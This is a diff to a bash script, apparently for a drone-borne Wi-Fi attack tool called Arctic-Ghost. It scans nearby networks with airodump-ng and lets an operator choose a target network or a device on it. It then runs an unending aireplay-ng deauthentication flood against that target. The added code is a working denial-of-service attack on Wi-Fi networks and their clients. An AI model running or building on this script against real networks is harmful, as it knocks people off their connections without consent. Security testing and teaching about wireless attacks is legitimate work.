@@ -25,7 +25,7 @@ sleep 10
 
 switch="0"
 
-time=10
+time=60
 mkdir scan1
 chmod 775 scan1
 cd scan1
@@ -58,7 +58,7 @@ else
 
 	timeout $time sudo airodump-ng -w bigData --output-format csv wlan0
 	echo "Your data file has been created in the Arctic-Ghost directory"
-	echo "Select the Wi-Fi to you wish to attack..."
+	echo "Select the Wi-Fi you wish to attack..."
 fi
 
 #sudo iwconfig wlan0 channel 6
@@ -68,42 +68,131 @@ declare -A networks
 declare -A channels
 while IFS=, read -r bssid first last channel speed privacy cipher authentication power numBeacons numIV lanIP lenID essid key
 do
-	if [[ "$essid" = *[!\ ]* ]]; then
+	if [[ "$lanIP" = *[!\ ]* ]]; then
 		if [ "$essid" != " ESSID" ]; then
-			echo "${bold}ESSID:${normal} $essid ${bold}BSSID:${normal} $bssid"
+			if [[ "$essid" != *[!\ ]* ]]; then
+				echo "${bold}ESSID:${normal} Hidden Network ${bold}BSSID:${normal} $bssid"
+			else
+				echo "${bold}ESSID:${normal} $essid ${bold}BSSID:${normal} $bssid"
+			fi
 			networks["$bssid"]="$essid"
 			channels["$bssid"]="$channel"
 		fi
 	fi
 done < bigData-01.csv
 
-# Prompt Operator for network to attack:
-invalid=true
-while $invalid; do
-	read -p "Enter BSSID of Network to attack: " targetVar < /dev/tty
-	for name in "${!networks[@]}"; do
-		if [ $name == $targetVar ]; then
-			invalid=false
+# Check if any networks were found
+if [ "${#networks[@]}" -eq 0 ]; then
+	echo "No Networks Detected"
+else
+	# Attack a network or scan further for devices on a specified network
+	badOption=true
+	networkOption=N
+	deviceOption=D
+	while $badOption; do
+		read -p "Enter 'N' to attack a network or 'D' to attack a device on a network: " option < /dev/tty
+		if [ $option == $networkOption ]; then
+			badOption=false
+			# Prompt Operator for network to attack:
+			invalid=true
+			while $invalid; do
+				read -p "Enter BSSID of Network to attack: " targetVar < /dev/tty
+				for name in "${!networks[@]}"; do
+					if [ $name == $targetVar ]; then
+						invalid=false
+					fi
+				done
+				if $invalid; then
+					echo "Invalid BSSID entered. Try again."
+				fi
+			done
+			echo "Attacking network $targetVar"
+			# set channel to channel the targeted network is on
+			targetChannel=${channels["$targetVar"]}
+			# trim leading whitespace
+			targetChannel=${targetChannel##*( )}
+			# echo "Target Channel: $targetChannel"
+			sudo iwconfig wlan0 channel $targetChannel
+			# send attack to selected network
+			sudo aireplay-ng --deauth 0 -a $targetVar -D wlan0
+			# print contents of associative array
+			#for name in "${!networks[@]}"; do
+				#echo "$name - ${networks[$name]}"
+			#done
+		elif [ $option == $deviceOption ]; then
+			badOption=false
+			# Prompt operator for network to scan on
+			invalid=true
+			while $invalid; do
+				read -p "Enter BSSID of Network to scan for devices on: " targetVar < /dev/tty
+				for name in "${!networks[@]}"; do
+					if [ $name == $targetVar ]; then
+						invalid=false
+					fi
+				done
+				if $invalid; then
+					echo "Invalid BSSID entered. Try again."
+				fi
+			done
+			echo "Scanning for devices on network $targetVar"
+			# set channel to channel the targeted network is on
+			targetChannel=${channels["$targetVar"]}
+			# trim leading whitespace
+			targetChannel=${targetChannel##*( )}
+			sudo iwconfig wlan0 channel $targetChannel
+			timeout $time sudo airodump-ng wlan0 --bssid $targetVar --channel $targetChannel -w networkDevices --output-format csv
+			echo "Your data file has been created in the Arctic-Ghost directory"
+			echo "Select the device you wish to attack..."
+			# Print out Station MAC of each device on the network and load it into an associative array
+			declare -A stationMACs
+			index=0
+			# Read until device header line
+			linesToSkip=5
+			{
+				for ((i=$linesToSkip;i--;)) ;do
+					read
+				done
+				while read line; do
+					IFS=','
+					read -ra arr <<<"$line"
+					if [[ ${arr[0]} = *[![:space:]]* ]]; then
+						stationMACs["$index"]=${arr[0]}
+						((index=index+1))
+					fi
+				done
+			} < networkDevices-01.csv
+
+			# Check if any devices were found
+			if [ "${#stationMACs[@]}" -eq 0 ]; then
+				echo "No Devices Detected"
+			else
+				for name in "${!stationMACs[@]}"; do
+					echo "${bold}Device MAC:${normal} ${stationMACs[$name]}"
+				done
+				invalid=true
+				while $invalid; do
+					read -p "Enter MAC of device to attack: " targetDevice < /dev/tty
+					for name in "${!stationMACs[@]}"; do
+						if [ "${stationMACs[$name]}" == $targetDevice ]; then
+							invalid=false
+						fi
+					done
+					if $invalid; then
+						echo "Invalid device MAC entered. Try again."
+					fi
+				done
+				echo "Attacking device $targetDevice"
+				# execute attack
+				sudo iwconfig wlan0 channel $targetChannel
+				sudo aireplay-ng --deauth 0 -a $targetVar -c $targetDevice -D wlan0
+			fi
+
+		else
+			echo "Invalid option entered. Try again."
 		fi
 	done
-	if $invalid; then
-		echo "Invalid BSSID entered. Try again."
-	fi
-done
-echo "Attacking network $targetVar"
-# set channel to channel the targeted network is on
-targetChannel=${channels["$targetVar"]}
-# trim leading whitespace
-targetChannel=${targetChannel##*( )}
-# echo "Target Channel: $targetChannel"
-sudo iwconfig wlan0 channel $targetChannel
-# send attack to selected network
-sudo aireplay-ng --deauth 0 -a $targetVar wlan0
-# print contents of associative array
-#for name in "${!networks[@]}"; do
-	#echo "$name - ${networks[$name]}"
-#done
 
+fi
 # There are two options for this attack:
 
 # 1) Send the drone back to home base after collecting the wifi data and the operator reads the 
